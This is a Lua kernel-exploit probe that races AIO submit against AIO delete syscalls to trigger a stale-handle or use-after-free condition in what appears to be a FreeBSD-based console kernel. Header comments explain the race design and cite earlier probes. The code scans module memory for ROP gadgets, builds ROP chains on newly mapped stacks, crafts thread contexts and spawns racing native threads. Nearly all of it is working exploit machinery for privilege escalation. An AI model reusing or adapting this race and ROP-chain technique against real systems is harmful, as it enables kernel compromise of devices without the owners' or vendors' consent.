-- CRASH_CLASS: HIGH
-- PROBE 416a: submit raced by delete instead of cancel
--
-- 414a could not overlap: the child finished 1200 submits before the Lua thread's first
-- read of the id slot, because every Lua-side syscall costs ~180 us and every native one
-- does not. The only way to collide is to let both sides be native.
--
--   child A: 1200 x 669(cmd=1, descriptor, count=1, class=1, ids)   [submit]
--   child B: 1200 x 662(ids, 1, out)                                [delete]
--
-- 415a raced cancel against submit and finished clean. Delete is the harsher side:
-- it frees the request slot, so a submission that publishes its handle while the slot is
-- being reclaimed is exactly the shape that produces a stale identifier.
-- A clean finish means the queue holds its references; a fault means it does not.
-- Two children: 405a starved the loader at five parked children, so this is the limit
-- that still leaves the loader responsive.

print("=== PROBE 416a: AIO DELETE RACE ===")

local SUBMITS = 1200
local CANCELS = 1200  -- delete links

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end
local function rdq(a)
    local q = memory.read_qword(a)
    if type(q) == "table" then return to_num(q.l) end
    return to_num(q)
end

local path = memory.alloc(0x40)
do
    local s = "/dev/zero"
    local i = 1
    while i <= #s do memory.write_byte(path + i - 1, s:byte(i)); i = i + 1 end
    memory.write_byte(path + #s, 0)
end
local fd = call(5, sgn(path), 0, 0)
print(string.format("[A] open /dev/zero fd=%d", fd))
if fd <= 0 then print("=== 416a DONE ===") return end

local req = memory.alloc(0x40)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x40)
local ids = memory.alloc(0x20)
local cout = memory.alloc(0x40)
memory.write_qword(ids, u64(0, 0))
memory.write_qword(result, u64(0, 0))
memory.write_byte(req + 0x00, 0)
memory.write_qword(req + 0x08, u64(0, 0x1000))
memory.write_qword(req + 0x10, u64v(sgn(data)))
memory.write_qword(req + 0x18, u64v(sgn(result)))
memory.write_dword(req + 0x20, fd)

local sub = call(669, 1, sgn(req), 1, 1, sgn(ids))
print(string.format("[A] control submit rv=%d id=0x%X", sub, rdq(ids)))
local pol = call(664, sgn(ids), 1, sgn(cout))
print(string.format("[A] control poll rv=%d state=0x%X", pol, rdq(cout)))
local del = call(662, sgn(ids), 1, sgn(cout))
print(string.format("[A] control delete rv=%d out=0x%X", del, rdq(cout)))
memory.write_qword(ids, u64(0, 0))

local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 416a DONE ===") return end
    buf = b
end
local park, pop_rax = 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[B] base=0x%X park=0x%X pop=0x%X gadget=0x%X", base, park, pop_rax, gadget))
if park <= 0 or pop_rax <= 0 or gadget <= 0 then print("=== 416a DONE ===") return end

-- build a chain: n links of `number`, then park, on a fresh 2 MiB stack
local function build_chain(num, links)
    local stack = call(477, 0, 0x200000, 3, 0x1002, 0xFFFFFFFF, 0)
    if stack <= 0 then return nil end
    local rsp = stack + 0x100000
    local p = rsp
    local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
    wq(num)
    local i = 0
    while i < links do
        wq(gadget)
        if i < links - 1 then
            wq(pop_rax)
            wq(num)
        end
        i = i + 1
    end
    wq(park)
    return rsp
end

local function make_ctx(rsp, nargs)
    local ctx = memory.alloc(0x500)
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
    memory.write_qword(ctx + 0x108, u64(0, 0x480))
    memory.write_qword(ctx + 0x110, u64(0, 0x10000))
    memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
    memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
    memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
    memory.write_qword(ctx + 0x0f8, u64v(rsp))
    memory.write_qword(ctx + 0x100, u64(0, 0x3b))
    memory.write_qword(ctx + 0x048, u64v(nargs[1] or 0))
    memory.write_qword(ctx + 0x050, u64v(nargs[2] or 0))
    memory.write_qword(ctx + 0x058, u64v(nargs[3] or 0))
    memory.write_qword(ctx + 0x060, u64v(nargs[4] or 0))
    memory.write_qword(ctx + 0x068, u64v(nargs[5] or 0))
    return ctx
end

local rsp_a = build_chain(669, SUBMITS)
local rsp_b = build_chain(662, CANCELS)
if not rsp_a or not rsp_b then print("=== 416a DONE ===") return end
local ctx_a = make_ctx(rsp_a, {1, sgn(req), 1, 1, sgn(ids)})
local ctx_b = make_ctx(rsp_b, {sgn(ids), 1, sgn(cout), 0, 0})
print(string.format("[C] chains armed: A=%d submits rsp=0x%X  B=%d deletes rsp=0x%X", SUBMITS, rsp_a, CANCELS, rsp_b))

local out = memory.alloc(0x20)
local tid_a, tid_b = 0, 0
local trv_a = call(430, sgn(ctx_a), sgn(out), 0)
tid_a = rdq(out)
local trv_b = call(430, sgn(ctx_b), sgn(out), 0)
tid_b = rdq(out)
print(string.format("[C] children: A rv=%d tid=0x%X   B rv=%d tid=0x%X", trv_a, tid_a, trv_b, tid_b))

-- let both run out
local t = 0
while t < 20000000 do t = t + 1 end

-- [E] did the queue survive two children tearing at it?
memory.write_qword(ids, u64(0, 0))
local q2 = call(669, 1, sgn(req), 1, 1, sgn(ids))
local id2 = rdq(ids)
local p2 = call(664, sgn(ids), 1, sgn(cout))
print(string.format("[E] submit after race rv=%d id=0x%X poll rv=%d state=0x%X", q2, id2, p2, rdq(cout)))
print(string.format("[E] thr_self rv=%d", call(432, sgn(out), 0)))
print("=== 416a DONE ===")
